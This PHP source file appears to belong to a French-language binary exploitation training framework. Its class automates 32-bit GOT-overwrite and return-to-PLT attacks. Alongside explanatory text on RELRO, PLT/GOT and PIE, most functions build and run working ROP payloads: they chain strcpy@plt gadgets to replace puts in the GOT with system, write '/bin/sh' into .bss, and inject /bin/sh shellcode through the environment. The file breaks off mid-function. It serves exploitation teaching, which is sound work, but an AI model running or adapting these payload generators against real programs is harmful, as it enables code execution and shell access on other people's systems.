<?php

/*
 * sh -c 'LD_PRELOAD=libthr.so ./FreeBSD_CVE-2017-FGPU'
 * 
 
 Réécriture des tables de fonctions virtuelles
En C++, l'une des innovations majeures vis à vis du C est l'utilisation du paradigme de
programmation orienté objet. Les objets ont la capacité d'hériter de différents objets (y compris de
plusieurs, simultanément), et chaque objet peut surcharger des méthodes précédemment définies,
si celles-ci sont déclarées avec le mot virtual.
Pour gérer ce système de surcharge (overriding), un système de tables référençant les différentes
méthodes virtuelles a été créé : les virtual pointers ou VPtr.
Une instance d'objet est représentée en interne par une sorte de structure en mémoire. Par défaut,
seules les propriétés occupent une place dans cette structure. Les méthodes finales n'occupent pas
de place : le compilateur utilise directement leurs adresses lors d'un appel à CALL. Si une classe
possède au moins une méthode virtuelle, le premier champ de la structure est un pointeur (le VPtr)
vers une zone mémoire contenant des pointeurs de fonctions (les fonctions virtuelles) ; cette table
est la Virtual Method Table (VTBL). Lorsqu'une classe hérite de méthodes virtuelles et surcharge
l'une d'entre elles, la VTBL de ses instances contient un pointeur vers la méthode surchargée.
Si une classe hérite de plusieurs autres classes, il existe une VTBL par classe mère.



Protections We Face: ASCII Armor Zones
- Glibc mmap shared lib functions to 'armor zone' of initial 1-16mb range of address space
- Causes several function addresses start with 0x00 (null byte)
- execshield maps base address of libraries here


Protections We Face: RELRO
- Relocation Read-Only (GNU_RELRO)
- Values/segments that need relocation before runtime (ex: const value in dynamically (re)located function), are made RO after linker resolves symbols but before exec*
- .ctors, .dtors, .jcr, .dynamic and .got (not .got.plt), in particular, addressed
- ELF sections reordered so internal data segments (above) come before program data segments (code/bss)
- Two RELRO modes
	Partial (lazy linking/-z,relro)
		Static symbol addresses for most of GOT
		Resolved on function use, so section needs to be writeable
		PLT placed at known offset from .text/.code
	Full (BIND_NOW/-z,now)
		Dynamic linker resolves symbols when program starts or SO uses dlopen
		.got.plt now read-only
- Linker dies silently on ia64 platforms (no protection && no warning)
 */



class ret2got4linux extends bin4linux{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
		$name = __CLASS__;
		$rep_path = "$this->dir_tmp/$name";
		if (!file_exists($rep_path)) $this->create_folder($rep_path);
	}



// ###################################################################################################################

	function ret2got_gets_cmd($offset) {
		$this->article("Scenario", "dans le cas ou on a pas /bin/sh ou sh dans le programme et dans les libs -> libc + ld + our prog + non writeable STACK");	
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	&gets() + &pop_ret + &vuln_buf +
	who@plt + pop pop ret + GOT_of_where[0]+0 + &exec[8-9] +
	who@plt + pop pop ret + GOT_of_where[0]+1 + &exec[6-7] +
	who@plt + pop pop ret + GOT_of_where[0]+2 + &exec[4-5] +
	who@plt + pop pop ret + GOT_of_where[0]+3 + &exec[2-3] +
	PLT_of_where + &pop_ret + &vuln_buf + &exit + &vuln_buf");
		$this->pause();

		$who = "strcpy";
		$this->pause();
		$stdin = "gets";
		$pop1ret_tab = $this->elf2pop1ret4all("e?x", "all");
		$pop1ret = $pop1ret_tab[0];
		$buffer = "buffer";
		$who = "strcpy" ;
		$pop2ret_tab = $this->elf2pop2ret4all("all");
		$pop2ret = $pop2ret_tab[0];
		$where = "puts";
		$exec = "system";
		$exit = "exit";

		$this->payload_ret2got_gets_cmd($offset,$stdin,$pop1ret,$buffer, $who,$pop2ret,$where, $exec, $exit);
		$this->pause();
		
	}
	

	function payload_ret2got_gets_cmd($offset,$stdin,$pop1ret,$buffer, $who,$pop2ret,$where, $exec, $exit) {
		$addr_exit = $this->elf2addr4fonction_prog(trim($exit));
		$addr_exec = $this->elf2addr4fonction_prog(trim($exec));
		$addr_vuln_buf = trim($this->req_ret_str("$this->file_path AA | grep '$buffer' | grep -Po \"0x[0-9a-fA-F]{7,8}\""));
		
		$strcpy_plt = $this->elf2addr4fonction_plt($who);
		$where_got = $this->elf2addr4fonction_got($where);
		$addr_stdin = $this->elf2addr4fonction_prog($stdin);
		$where_got_0 = $where_got;
		$where_got_1 = $this->addr2add($where_got_0,1);
		$where_got_2 = $this->addr2add($where_got_0,2);
		$where_got_3 = $this->addr2add($where_got_0,3);
	
		$this->pause();
	
		$addr_exec_0 = $this->elf2addr4opcode("$addr_exec[2]$addr_exec[3]");
		$addr_exec_1 = $this->elf2addr4opcode("$addr_exec[4]$addr_exec[5]");
		$addr_exec_2 = $this->elf2addr4opcode("$addr_exec[6]$addr_exec[7]");
		$addr_exec_3 = $this->elf2addr4opcode("$addr_exec[8]$addr_exec[9]");
	
		$where_plt = $this->elf2addr4fonction_plt($where);
		
		$addr_stdin = $this->hex2norme_32($addr_stdin);
		$pop1ret = $this->hex2norme_32($pop1ret);
		$addr_vuln_buf = $this->hex2norme_32($addr_vuln_buf);
		$strcpy_plt = $this->hex2norme_32($strcpy_plt);
		$pop2ret = $this->hex2norme_32($pop2ret);
		$where_got_0 = $this->hex2norme_32($where_got_0);
		$where_got_1 = $this->hex2norme_32($where_got_1);
		$where_got_2 = $this->hex2norme_32($where_got_2);
		$where_got_3 = $this->hex2norme_32($where_got_3);
		$addr_exec_0 = $this->hex2norme_32($addr_exec_0);
		$addr_exec_1 = $this->hex2norme_32($addr_exec_1);
		$addr_exec_2 = $this->hex2norme_32($addr_exec_2);
		$addr_exec_3 = $this->hex2norme_32($addr_exec_3);
		$where_plt = $this->hex2norme_32($where_plt);
		$addr_exit = $this->hex2norme_32($addr_exit);
		
		
		
		
		
		$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
		&$stdin() + &pop_ret + &$buffer +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+0 + &$exec"."[8-9] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+1 + &$exec"."[6-7] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+2 + &$$exec"."[4-5] +
		$who@plt + pop pop ret + GOT_of_$where"."[0]+3 + &$exec"."[2-3] +
		PLT_of_$where + &pop_ret + &$buffer + &$exit + &$buffer");
				$this->pause();
		$this->article("&$stdin", $addr_stdin);	
		$this->article("POP RET", $pop1ret);
		$this->article("&$buffer", $addr_vuln_buf);
		$this->article("$who@plt", $strcpy_plt);
		$this->article("POP POP RET", $pop2ret);
		$this->article("$where@got[0]+0", $where_got_0);
		$this->article("$where@got[0]+1", $where_got_1);
		$this->article("$where@got[0]+2", $where_got_2);
		$this->article("$where@got[0]+3", $where_got_3);
		$this->article("@$exec"."[8-9]", $addr_exec_3);
		$this->article("@$exec"."[6-7]", $addr_exec_2);
		$this->article("@$exec"."[4-5]", $addr_exec_1);
		$this->article("@$exec"."[2-3]", $addr_exec_0);
		$this->article("$where@plt", $where_plt);
		$this->article("@$exit", $addr_exit);
	
		$addr_stdin = $this->hex2rev_32($addr_stdin);
		$pop1ret = $this->hex2rev_32($pop1ret);
		$addr_vuln_buf = $this->hex2rev_32($addr_vuln_buf);
		$strcpy_plt = $this->hex2rev_32($strcpy_plt);
		$pop2ret = $this->hex2rev_32($pop2ret);
		$where_got_0 = $this->hex2rev_32($where_got_0);
		$where_got_1 = $this->hex2rev_32($where_got_1);
		$where_got_2 = $this->hex2rev_32($where_got_2);
		$where_got_3 = $this->hex2rev_32($where_got_3);
		$addr_exec_0 = $this->hex2rev_32($addr_exec_0);
		$addr_exec_1 = $this->hex2rev_32($addr_exec_1);
		$addr_exec_2 = $this->hex2rev_32($addr_exec_2);
		$addr_exec_3 = $this->hex2rev_32($addr_exec_3);
		$where_plt = $this->hex2rev_32($where_plt);
		$addr_exit = $this->hex2rev_32($addr_exit);
		
		
		
		$cmd = "python -c 'print \"\x41\"*$offset+\"$addr_stdin\"+\"$pop1ret\"+\"$addr_vuln_buf\"+\"$strcpy_plt\"+\"$pop2ret\"+\"$where_got_0\"+\"$addr_exec_3\"+\"$strcpy_plt\"+\"$pop2ret\"+\"$where_got_1\"+\"$addr_exec_2\"+\"$strcpy_plt\"+\"$pop2ret\"+\"$where_got_2\"+\"$addr_exec_1\"+\"$strcpy_plt\"+\"$pop2ret\"+\"$where_got_3\"+\"$addr_exec_0\"+\"$where_plt\"+\"$pop1ret\"+\"$addr_vuln_buf\"+\"$addr_exit\"+\"$addr_vuln_buf\"'";
		
		$query = "$this->file_path  \$($cmd)";
		$this->payload2check4norme($cmd,$this->badchars);
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		return $cmd;
	}
	
	
function ret2got_write_cmd2section($offset) {
	$this->chapitre("PUT CMD into - BSS ");
	$this->article("Scenario", "dans le cas ou on a pas /bin/sh ou sh dans le programme et dans les libs -> libc + ld + our prog + non writeable STACK");
	
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	who@plt + pop pop ret + &section[0]+0 + &'/' +
	who@plt + pop pop ret + &section[0]+1 + &'b' +
	who@plt + pop pop ret + &section[0]+2 + &'i' +
	who@plt + pop pop ret + &section[0]+3 + &'n' +
	who@plt + pop pop ret + &section[0]+4 + &'/' +
	who@plt + pop pop ret + &section[0]+5 + &'s' +
	who@plt + pop pop ret + &section[0]+6 + &'h' +
	who@plt + pop pop ret + &section[0]+7 + &'0x00' +
	who@plt + pop pop ret + GOT_of_where[0]+0 + &system[8-9] +
	who@plt + pop pop ret + GOT_of_where[0]+1 + &system[6-7] +
	who@plt + pop pop ret + GOT_of_where[0]+2 + &system[4-5] +
	who@plt + pop pop ret + GOT_of_where[0]+3 + &system[2-3] +
		PLT_of_where + &exit() + &section[0] ");
	$this->pause();
	
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$system = $this->elf2addr4fonction_prog("system");
	$who = "strcpy";
	$this->pause();


	
		
	$this->rouge("BSS from PROG");  // OK 
	$bss_start_prog = $this->elf2bss2start();	
	$this->ssTitre("With Exit -> Cleaned Output");
	$this->payload_ret2got_write_cmd2section($offset, $who, $bss_start_prog, "puts", $system, $addr_exit);
	$this->pause();
	$this->question("is there others .bss sections");
	$dlls = $this->elf2dlls();
	$this->pause();
	 
	$this->rouge("BSS from LD");  // OK 
	$bss_start_ld = $this->elf2bss2start4ld(); 
	$this->pause();
	$this->payload_ret2got_write_cmd2section($offset, $who, $bss_start_ld, "puts", $system, $addr_exit);
	$this->pause();
	
	$this->rouge("BSS from LIBC");  // OK 
	$bss_start_libc = $this->elf2bss2start4libc();
	$this->pause();
	$this->payload_ret2got_write_cmd2section($offset, $who, $bss_start_libc, "puts", $system, $addr_exit);
	$this->pause();
	$fonctions = $this->req_ret_tab("gdb --batch -q -ex \"info functions\" $this->file_path | grep '@plt' | grep 'strcpy@plt' -A20 | cut -d' ' -f3 | cut -d'@' -f1");
	$this->rouge("Test All Functions after strcpy With CMD Address");
	for($i = 1; $i < count($fonctions); $i ++) if (!empty($fonctions[$i])){
		$this->titre("Test on $fonctions[$i] function");
		$this->payload_ret2got_write_cmd2section($offset, $who,$bss_start_prog, $fonctions[$i], $system, $addr_exit);	
	}
	$this->pause();	


	$this->rouge("Check ALL Sections which we can write /bin/sh | sh | bash ");  // OK
	$data_start_prog = $this->elf2sections4all2start();
	foreach ($data_start_prog as $section ){
		$this->payload_ret2got_write_cmd2section_small($offset, $who, $section, "puts", $system, $addr_exit);
	}
}


function ret2got_patch() {
	$this->ssTitre("Relocation Read Only (RELRO)"); // contremeasure Mark GOT/PLT as read-only if possible
	$this->article("The RELRO technique (enabled by default on recent Linux distributions)"," marks the relocation sections used to dynamically
	 * dynamically loaded functions read-only (.ctors, .dtors, .jcr, .dynamic and .got): this means that the program crashes
	 * if it tries to modifies one of these sections.
	 * The __do_global_dtors_aux function (which is the one executing the destructors) has been hardened in 2007 in such a way
	 * that only the destructors actually defined in the code are going to be executed.");
	$this->article("Resume", "Read-only relocation
Il s’agit d’une protection mise en place par GCC, permettant de demander au linker de résoudre les fonctions de bibliothèques dynamiques au tout début de l’exécution, et donc de pouvoir remapper la section GOT et GOT.plt en lecture seule.");
	
	$this->article("PIC Protection","Rappels théoriques
il convient de clarifier la notion de PIC, ou Position Independant Code.
Un code exécutable est dit PIC s’il peut être mappé à l’importe quelle région mémoire tout en pouvant s’exécuter convenablement.
Dans de tels exécutables, aucune adresse absolue ne doit apparaître, puisque si l’exécutable se retrouve translaté en mémoire, les adresses absolues ne seront plus valides.
Dans Linux, les librairies dynamiques sont en PIC. C’est le linker dynamique, ld.so, qui les charge en mémoire à l’exécution, et leur place en mémoire peut varier d’une exécution à une autre.
Ainsi, l’adresse des fonctions de la libraire standard, telles que printf(), changent de place à chaque exécution.
Pourtant, un programme qui utilise printf() n’est compilé qu’une seule fois.
Comment les processus arrivent-ils donc à s’exécuter tout en prenant en compte cette variation d’adresses ?
");
	$this->net("https://en.wikipedia.org/wiki/Position-independent_code");
	$this->article("Le PIE (Position Independent Executable)"," est une technique qui permet de compiler et lier des exécutables pour être « position independent ». 
  Un exécutable compilé avec cette caractéristique est considéré comme une bibliothèque partagée et se comporte comme telle. 
  Ce qui permet à l'adresse de base d'être repositionnée.
  Chaque invocation du programme compilé avec PIE sera chargée dans un emplacement mémoire différent. 
  Vous remarquez aussi que notre exécutable n'est pas complètement aléatoire et que les zones data, text, bss conservent leurs adresses à chaque exécution. 
  Mais pour éviter les attaques ROP, PaX propose des mécanismes tels que RANDMAP et RANDEXEC.
  Note :
  Le PIE n'a aucun effet sans ASLR. Différents modes existent pour l'ASLR (fichier proc/sys/kernel/randomize_va_space) :
  0. désactivé ;
  1. distribution aléatoire de l'espace d'adressage de la bibliothèque partagée et des exécutables PIE ;
  2. même fonction que le mode 1 + l'espace « brk » aléatoire.");
	}


function ret2got_intro() {
	$this->titre("GOT Intro");
	$this->img("$this->dir_img/bof/got_plt.png");
	$this->img("$this->dir_img/bof/got_schema.png");
	$this->pause();
	$this->elf2sections();$this->pause();
	
	
	$this->requette("gdb -q --batch -ex 'maintenance info section .got.plt' $this->file_path");$this->pause();
	$this->requette("objdump -R $this->file_path");$this->pause();
	$this->elf2addr4got_all();$this->pause();
	

	$this->elf2dlls();$this->pause();
	$this->requette("ldd $this->file_path");
	$this->pause();
	$this->titre("Return to PLT -> Bypass ASCII ARMOR @system @execve");
	$this->note("in our case we don't have ASCII ARMOR protection but we do like is enable");
	$this->requette("ldd --version"); 
	$this->article("Target", "reperer les fonctions qui sont apres l'appel strcpy@plt \nOn remarque puts@plt vient apres strcpy@plt\n nous allons detourner l'appel de puts@plt qui vient apres strcpy@plt");
	$this->elf2fonctions();$this->pause();
	$this->article("PLT", "La Procedure Linkage Table (PLT) est une structure dans la section .text dont les entrées sont constituées de quelques lignes de code qui s’occupent de passer le
	contrôle aux fonctions externes requises ou, si la fonction est appelée pour la première fois, d’effectuer la résolution de symboles par le run time link editor.");
	$this->pause();
	$this->article("Pour comprendre à quoi sert la PLT", " il faut savoir comment fonctionnent l’édition des liens en présence de bibliothèques partagées sous Linux. 
	L’édition des liens pour les références à une bibliothèque partagée ne se fait pas lors de la compilation d’un programme, mais lors de l’exécution (édition des liens dynamiques). 
	En effet, lorsqu’un programme effectue un appel à une fonction qui se trouve dans une bibliothèque partagée, l’éditeur des liens ne sait pas à quelle adresse la bibliothèque partagée sera chargée lors de l’exécution, ni à quel endroit dans cette bibliothèque se trouvera la fonction appelée. 
	Il crée donc une entrée dans la PLT pour cette fonction.");
	$this->pause();

	$this->ssTitre("PLT");
	$this->elf2plt2size();$this->pause();
	$this->requette("objdump -d -j .plt $this->file_path");$this->pause();
	$this->article("GOT", "La Global Offset Table (GOT) est un tableau stocké dans la section .data qui contient des pointeurs sur des objets. 
	C’est le rôle du dynamic linker de mettre à jour ces pointeurs quand ces objets sont utilisés.
	Lorsqu’un programme utilise dans son code une fonction externe, par exemple la fonction libc system(), le CALL ne saute pas directement dans la libc mais dans une
	entrée de la PLT (Procedure Linkage Table). 
	La première instruction dans cette entrée PLT va sauter dans un pointeur stocké dans la GOT (Globale Offset Table). 
	Si cette fonction system() est appelée pour la première fois, l’entrée correspondante dans la GOT contient l’adresse de la prochaine instruction à exécuter de la PLT qui va
	pusher un offset et sauter à l’entrée 0 de la PLT. 
	Cette entrée 0 contient du code pour appeler le runtime dynamic linker pour la résolution de symbole et ensuite stocker
	l’adresse du symbole. Ainsi les prochaines fois que system() sera appelé dans le programme, l’entrée PLT associée à cette fonction redirigera le programme
	directement au bon endroit en libc car l’entrée GOT correspondante contiendra l’adresse dans la libc de system().
	Cette approche où la résolution d’un symbole est faite uniquement lorsqu’il est requis et non dès l’appel du programme s’appelle lazy symbol bind (résolution tardive de
	symboles). C’est le comportement par défaut d’un ELF. 
	La résolution de symboles dès l’appel du programme peut être forcée en donnant la valeur 1 à la variable shell LD_BIND_NOW. ");
	$this->pause();
	$this->ssTitre("GOT.PLT");
	$this->requette("objdump -d -j .got.plt $this->file_path");
	$this->pause();
	$this->article("Main function", "call functions");
	$this->requette("gdb -q --batch -ex 'set disassembly-flavor intel' -ex 'r AAAA' -ex 'disas main' $this->file_path");
	$this->pause();
	$this->requette("gdb -q --batch -ex 'set disassembly-flavor intel' -ex 'r AAAA' -ex 'disas main' $this->file_path | grep '@plt' ");
	$this->pause();
	$this->requette("gdb -q --batch -ex 'info functions' $this->file_path ");
	$this->pause();
	$addr = $this->hex2norme_32(trim($this->req_ret_str("gdb -q --batch -ex 'info functions' $this->file_path | grep 'puts@plt' | grep -Po \"0x[0-9a-fA-F]{7,8}\" ")));
	$this->elf2addr4content_hex($addr, "AAAA");$this->pause();
	$this->elf2asm4hex($addr);
	$this->pause();
	$addr2 = $this->hex2norme_32(trim($this->req_ret_str("gdb --batch -q -ex 'r AAAA' -ex \"x/i $addr\" $this->file_path | tail -1 | cut -d'*' -f2 ")));
	$this->elf2addr4content_hex($addr2, "AAAA");$this->pause();
	$this->elf2asm4hex($addr2);
	$this->pause();
	
	$query = "gdb --batch -q $this->file_path -ex 'b 24' -ex 'run AAAA' -ex 'x/1i $addr' -ex 'x/x $addr2' -ex 'printf \"\\t\\tChange Pointer to other place\\n\"' -ex 'set variable *($addr2)=0x41414141' -ex 'x/x $addr2' -ex 'c' -ex 'i r eip' ";
	$this->requette($query);
	$this->pause();
	
	$addr_system = $this->elf2addr4fonction_prog("system");
	$this->remarque("replace puts@got.plt with &system() -> <puts@got.plt>=$addr_system ");
	$this->article("Deroulement", "la fonction puts() va etre remplacee par la fonction system() donc ce qui va etre affiche par puts(XX) va etre execute par system(XX)");
	$this->requette("grep -i 'puts' $this->dir_c/ret2got32l.c");
	$this->pause();
	$this->requette("$this->file_path AAAA");
	$this->pause();
	$this->elf2asm4hex($addr_system);
	
	$this->elf2addr4fonction_plt("puts");
	$this->elf2addr4fonction_got("puts");
	$this->elf2addr4fonction_prog("puts");
	
	$query = "gdb --batch -q $this->file_path -ex 'b 24' -ex 'run AAAA' -ex 'x/1i $addr' -ex 'x/x $addr2' -ex 'printf \"\\t\\tChange Pointer to other place\\n\"' -ex 'set variable *($addr2)=$addr_system' -ex 'x/x $addr2' -ex 'c' ";
	$this->requette($query);
	$this->pause();
	$this->remarque("S’il l’on ne peut pas sauter directement en libc car les adresses contiennent toutes un byte 0, on peut toujours sauter dans la section PLT. 
	Le problème est que la fonction libc que nous voulons utiliser doit exister dans le programme vulnérable pour qu’elle possède une entrée dans la PLT.");
}

function payload_ret2got_fonction($offset,$who,$where,$what) { // OK
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	$who@plt + pop pop ret + GOT_of_where[0]+0 + &what[8-9] +
	$who@plt + pop pop ret + GOT_of_where[0]+1 + &what[6-7] +
	$who@plt + pop pop ret + GOT_of_where[0]+2 + &what[4-5] +
	$who@plt + pop pop ret + GOT_of_where[0]+3 + &what[2-3] +
		PLT_of_where");
	$this->pause();
	$strcpy_plt = $this->elf2addr4fonction_plt($who);
	$where_got = $this->elf2addr4fonction_got($where);
	$where_plt = $this->elf2addr4fonction_plt($where);
	$tab_pop = $this->elf2pop2ret4all("all");
	$pop = $tab_pop[0];

	$where_got_0 = $where_got;
	$where_got_1 = $this->addr2add($where_got_0,1);
	$where_got_2 = $this->addr2add($where_got_0,2);
	$where_got_3 = $this->addr2add($where_got_0,3);

	$what_0 = $this->elf2addr4opcode("$what[2]$what[3]");
	$what_1 = $this->elf2addr4opcode("$what[4]$what[5]");
	$what_2 = $this->elf2addr4opcode("$what[6]$what[7]");
	$what_3 = $this->elf2addr4opcode("$what[8]$what[9]");

	$strcpy_plt = $this->hex2norme_32($strcpy_plt);
	$pop = $this->hex2norme_32($pop);
	$where_got_0 = $this->hex2norme_32($where_got_0); 
	$where_got_1 = $this->hex2norme_32($where_got_1);
	$where_got_2 = $this->hex2norme_32($where_got_2);
	$where_got_3 = $this->hex2norme_32($where_got_3);
	$what_0 = $this->hex2norme_32($what_0);
	$what_1 = $this->hex2norme_32($what_1);
	$what_2 = $this->hex2norme_32($what_2);
	$what_3 = $this->hex2norme_32($what_3);
	$where_plt = $this->hex2norme_32($where_plt);
	
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	$who@plt + pop pop ret + GOT_of_where[0]+0 + &what[8-9] +
	$who@plt + pop pop ret + GOT_of_where[0]+1 + &what[6-7] +
	$who@plt + pop pop ret + GOT_of_where[0]+2 + &what[4-5] +
	$who@plt + pop pop ret + GOT_of_where[0]+3 + &what[2-3] +
	PLT_of_where");
	$this->article("Fonction to replace", $where);
	$this->article("$who@plt", $strcpy_plt);
	$this->article("$where@got[0]+0", $where_got_0);
	$this->article("$where@got[0]+1", $where_got_1);
	$this->article("$where@got[0]+2", $where_got_2);
	$this->article("$where@got[0]+3", $where_got_3);
	$this->article("&what", $what);
	$this->article("&what[8-9]", $what_3);
	$this->article("&what[6-7]", $what_2);
	$this->article("&what[4-5]", $what_1);
	$this->article("&what[2-3]", $what_0);
	$this->article("$where@plt", $where_plt);
	
	$strcpy_plt = $this->hex2rev_32($strcpy_plt);
	$pop = $this->hex2rev_32($pop);
	$where_got_0 = $this->hex2rev_32($where_got_0); 
	$where_got_1 = $this->hex2rev_32($where_got_1);
	$where_got_2 = $this->hex2rev_32($where_got_2);
	$where_got_3 = $this->hex2rev_32($where_got_3);
	$what_0 = $this->hex2rev_32($what_0);
	$what_1 = $this->hex2rev_32($what_1);
	$what_2 = $this->hex2rev_32($what_2);
	$what_3 = $this->hex2rev_32($what_3);
	$where_plt = $this->hex2rev_32($where_plt);
	
	
	$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$where_got_0\"+\"$what_3\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_1\"+\"$what_2\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_2\"+\"$what_1\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_3\"+\"$what_0\"+\"$where_plt\"'";
	$query = "$this->file_path  \$($cmd)";
	$this->article("Payload", "\"A\"*(Offset EIP=$offset) (JUNK) +
	$who@plt + pop pop ret + GOT_of_$where"."[0]+0 + &'$what[8]$what[9]' +
	$who@plt + pop pop ret + GOT_of_$where"."[0]+1 + &'$what[6]$what[7]' +
	$who@plt + pop pop ret + GOT_of_$where"."[0]+2 + &'$what[4]$what[5]' +
	$who@plt + pop pop ret + GOT_of_$where"."[0]+3 + &'$what[2]$what[3]' +
		PLT_of_$where");
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	return $cmd;
}

function ret2got_fonction($offset){
	$this->gtitre("GOT JUMP INSIDE Programme");
	$who = "strcpy";
	$where = "puts";
	$this->ssTitre("Fonction to Jump -> shellcode_shell");
	$what = $this->hex2norme_32(trim($this->req_ret_str("$this->file_path AA | grep Shellcode_shell | cut -d':' -f2")));
	$this->article("who",$who);
	$this->article("where",$where);
	$this->article("what",$what);
	$this->pause();
	return $this->payload_ret2got_fonction($offset,$who,$where,$what);
}


function ret2got_env($offset){
	$this->chapitre("GOT ENV SHELLCODE ");
	$who = "strcpy";
	$where = "puts";
	$shellcode_hex = $this->shellcode_bin_sh;
	// $shellcode_hex = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'; // /bin/sh
	$this->shellcode2env4hex(1, $shellcode_hex);
	$shellcode_env = $this->elf2addr4env("shellcode");
	$what = $shellcode_env;
	return $this->payload_ret2got_fonction($offset,$who,$where,$what); // OK must have -z execstack
}




function payload_ret2got_system_exit_cmd_addr($offset,$who, $where, $system, $addr_exit, $bin_sh) {
	$this->titre("Hijacking $where by &system &exit &bin_sh ");
	$offset = trim($offset);
	$who = trim($who);
	$where = trim($where);
	$system = trim($system);
	$addr_exit = trim($addr_exit);
	$bin_sh = trim($bin_sh);
	
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+0 + &system[8-9] +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+1 + &system[6-7] +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+2 + &system[4-5] +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+3 + &system[2-3] +
		PLT_of_$where +  &exit() + &shell strings "); // rajouter une avec gets 
	$this->pause();
	$strcpy_plt = $this->elf2addr4fonction_plt($who);
	$tab_pop = $this->elf2pop2ret4all("all");
	$pop = $tab_pop[0];
	
	$where_plt = $this->elf2addr4fonction_plt($where);
	$this->elf2symbol4hex($where_plt);
	$where_got = $this->elf2addr4fonction_got($where);
	
	$where_got_0 = $where_got;
	$where_got_1 = $this->addr2add($where_got_0,1);
	$where_got_2 = $this->addr2add($where_got_0,2);
	$where_got_3 = $this->addr2add($where_got_0,3);
	
	$system = $this->hex2norme_32($system);
	$system_0 = $this->elf2addr4opcode("$system[2]$system[3]");
	$system_1 = $this->elf2addr4opcode("$system[4]$system[5]");
	$system_2 = $this->elf2addr4opcode("$system[6]$system[7]");
	$system_3 = $this->elf2addr4opcode("$system[8]$system[9]");
	
	$strcpy_plt = $this->hex2norme_32($strcpy_plt);
	$pop  = $this->hex2norme_32($pop); 
	$where_got_0  = $this->hex2norme_32($where_got_0); 
	$where_got_1 = $this->hex2norme_32($where_got_1); 
	$where_got_2 = $this->hex2norme_32($where_got_2); 
	$where_got_3 = $this->hex2norme_32($where_got_3);
	$system_0 = $this->hex2norme_32($system_0);
	$system_1 = $this->hex2norme_32($system_1);
	$system_2 = $this->hex2norme_32($system_2);
	$system_3 = $this->hex2norme_32($system_3);
	$where_plt = $this->hex2norme_32($where_plt);
	$addr_exit = $this->hex2norme_32($addr_exit);
	$bin_sh  = $this->hex2norme_32($bin_sh);
	
	
	$this->article("Template", "\"A\"*(Offset EIP=$offset) (JUNK) +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+0 + &system[8-9] +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+1 + &system[6-7] +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+2 + &system[4-5] +
	strcpy@plt + pop pop ret + GOT_of_$where\[0]+3 + &system[2-3] +
	PLT_of_$where +  &exit() + &shell strings ");
	$this->article("Fonction to replace", $where);
	$this->article("$who@plt", $strcpy_plt);
	$this->article("$where@got[0]+0", $where_got_0);
	$this->article("$where@got[0]+1", $where_got_1);
	$this->article("$where@got[0]+2", $where_got_2);
	$this->article("$where@got[0]+3", $where_got_3);
	$this->article("@system[8-9]", $system_3);
	$this->article("@system[6-7]", $system_2);
	$this->article("@system[4-5]", $system_1);
	$this->article("@system[2-3]", $system_0);
	$this->article("$where@plt", $where_plt);
	$this->article("@exit", $addr_exit);
	$this->article("&/bin/sh", $bin_sh);
	
	
	$strcpy_plt = $this->hex2rev_32($strcpy_plt);
	$pop  = $this->hex2rev_32($pop); 
	$where_got_0  = $this->hex2rev_32($where_got_0); 
	$where_got_1 = $this->hex2rev_32($where_got_1); 
	$where_got_2 = $this->hex2rev_32($where_got_2); 
	$where_got_3 = $this->hex2rev_32($where_got_3);
	$system_0 = $this->hex2rev_32($system_0);
	$system_1 = $this->hex2rev_32($system_1);
	$system_2 = $this->hex2rev_32($system_2);
	$system_3 = $this->hex2rev_32($system_3);
	$where_plt = $this->hex2rev_32($where_plt);
	$addr_exit = $this->hex2rev_32($addr_exit);
	$bin_sh  = $this->hex2rev_32($bin_sh);
	
	
	//$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$where_got_0\"+\"$system_3\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_1\"+\"$system_2\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_2\"+\"$system_1\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_3\"+\"$system_0\"+\"$where_plt\"+\"$addr_exit\"+\"$bin_sh\"'";
	$cmd = "python -c 'print \"\x41\"*$offset+\"$strcpy_plt\"+\"$pop\"+\"$where_got_0\"+\"$system_3\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_1\"+\"$system_2\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_2\"+\"$system_1\"+\"$strcpy_plt\"+\"$pop\"+\"$where_got_3\"+\"$system_0\"+\"$where_plt\"+\"$addr_exit\"+\"$bin_sh\"'";
	$query = "$this->file_path  \$($cmd)";
	$this->payload2check4norme($cmd,$this->badchars);
	$this->requette($query);
	return $cmd;
}





function ret2got_system_exit_cmd_addr($offset){
	$who = "strcpy";
	$where = "puts";
	$tab_bin_sh = $this->elf2addr4bin_sh_all();
	$bin_sh = $tab_bin_sh[0];
	$system = $this->elf2addr4fonction_prog("system");
	
	$this->ssTitre("With Exit -> Cleaned Output"); // OK
	$addr_exit = $this->elf2addr4fonction_prog("exit");
	$payload = $this->payload_ret2got_system_exit_cmd_addr($offset,$who,$where, $system, $addr_exit, $bin_sh);
	
	$this->pause();
	
	
	$this->chapitre("Test All Functions after strcpy with CMD String");  // OK
